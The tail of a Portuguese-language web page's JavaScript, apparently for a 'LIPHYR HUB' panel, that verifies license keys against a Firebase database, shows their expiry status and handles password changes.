            const keyInput = document.getElementById('keyInput').value.trim().toUpperCase();
            const resultDiv = document.getElementById('verifyResult');

            if (!keyInput || keyInput.length !== 19) {
                resultDiv.className = 'verify-result result-error';
                resultDiv.innerHTML = '<h3>Formato inv√°lido!</h3><p>Digite uma key no formato XXXX-XXXX-XXXX-XXXX</p>';
                resultDiv.style.display = 'block';
                return;
            }

            try {
                // Gerar ID da key
                const keyId = keyInput.replace(/-/g, '_');
                const keyRef = ref(database, 'keys/' + keyId);
                const snapshot = await get(keyRef);

                if (!snapshot.exists()) {
                    resultDiv.className = 'verify-result result-error';
                    resultDiv.innerHTML = '<h3>Key n√£o encontrada!</h3><p>Esta key n√£o existe no sistema.</p>';
                    resultDiv.style.display = 'block';
                    return;
                }

                const data = snapshot.val();
                const now = Date.now();
                
                if (!data.active) {
                    resultDiv.className = 'verify-result result-error';
                    resultDiv.innerHTML = '<h3>Key inativa!</h3><p>Esta key foi desativada.</p>';
                } else if (data.expiresAt && now > data.expiresAt) {
                    resultDiv.className = 'verify-result result-error';
                    resultDiv.innerHTML = '<h3>Key expirada!</h3><p>Esta key n√£o √© mais v√°lida.</p>';
                } else {
                    let timeLeftText = '';
                    let expiresDate = '';
                    
                    if (data.timeUnit === 'lifetime') {
                        timeLeftText = 'Vital√≠cia';
                    } else if (data.expiresAt) {
                        const timeLeft = data.expiresAt - now;
                        const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
                        const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
                        
                        if (days > 0) {
                            timeLeftText = `${days} dias`;
                        } else {
                            timeLeftText = `${hours} horas`;
                        }
                        
                        expiresDate = new Date(data.expiresAt).toLocaleDateString('pt-BR');
                    }
                    
                    const createdDate = new Date(data.createdAt).toLocaleDateString('pt-BR');
                    
                    resultDiv.className = 'verify-result result-success';
                    resultDiv.innerHTML = `
                        <h3>‚úÖ Key v√°lida!</h3>
                        <p><strong>Produto:</strong> ${data.product}</p>
                        <p><strong>Cliente:</strong> ${data.client}</p>
                        <p><strong>Status:</strong> Ativa</p>
                        <p><strong>Tempo restante:</strong> ${timeLeftText}</p>
                        <p><strong>Expira em:</strong> ${expiresDate}</p>
                        <p><strong>Criada em:</strong> ${createdDate}</p>
                    `;
                }
                
                resultDiv.style.display = 'block';
            } catch (error) {
                console.error('Error verifying key:', error);
                resultDiv.className = 'verify-result result-error';
                resultDiv.innerHTML = '<h3>Erro ao verificar!</h3><p>Tente novamente mais tarde.</p>';
                resultDiv.style.display = 'block';
            }
        }

        // Alterar senha
        async function changePassword() {
            const user = auth.currentUser;
            if (!user) return;
            
            const newPassword = document.getElementById('newPassword').value;
            const confirmPassword = document.getElementById('confirmPassword').value;
            
            if (!newPassword || !confirmPassword) {
                alert('Preencha todos os campos!');
                return;
            }
            
            if (newPassword !== confirmPassword) {
                alert('As senhas n√£o coincidem!');
                return;
            }
            
            if (newPassword.length < 6) {
                alert('A nova senha deve ter pelo menos 6 caracteres!');
                return;
            }
            
            try {
                await updatePassword(user, newPassword);
                
                document.getElementById('newPassword').value = '';
                document.getElementById('confirmPassword').value = '';
                
                const resultDiv = document.getElementById('passwordResult');
                resultDiv.textContent = '‚úÖ Senha alterada com sucesso!';
                resultDiv.style.display = 'block';
                
                setTimeout(() => {
                    resultDiv.style.display = 'none';
                }, 3000);
                
            } catch (error) {
                console.error('Error changing password:', error);
                alert('Erro ao alterar senha: ' + error.message);
            }
        }

        // =============== INICIALIZA√á√ÉO ===============

        // Inicializar sistema
        function initializeSystem() {
            createParticles();
            console.log('‚úÖ Sistema LIPHYR HUB inicializado');
        }

        // Event Listeners
        document.getElementById('loginPassword').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') loginUser();
        });
        
        document.getElementById('registerConfirmPassword').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') registerUser();
        });
        
        document.getElementById('keyInput').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') verifyKey();
        });

        // Iniciar
        window.addEventListener('DOMContentLoaded', initializeSystem);
    </script>
</body>
</html>
